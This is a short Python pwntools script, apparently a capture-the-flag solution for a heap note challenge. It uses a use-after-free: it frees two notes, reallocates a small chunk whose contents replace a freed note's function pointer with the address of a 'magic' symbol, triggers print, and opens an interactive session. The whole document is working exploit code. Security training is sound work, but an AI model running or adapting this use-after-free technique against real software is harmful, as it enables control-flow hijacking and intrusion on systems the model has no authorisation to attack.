io = start()

def create(_size: int, _content: str):
    io.sendlineafter('choice :', b'1')
    io.sendlineafter("size :", str(_size).encode())
    io.sendafter("Content :", _content)

def delete(_index: int):
    io.sendlineafter('choice :', b'2')
    io.sendlineafter('Index :', str(_index).encode())

def _print(_index: int):
    io.sendlineafter('choice :', b'3')
    io.sendlineafter('Index :', str(_index).encode())


create(48, b"a" * 4)
create(48, b"b" * 4)
delete(0)
delete(1)
create(8, p32(exe.sym.magic))
_print(0)
io.interactive()
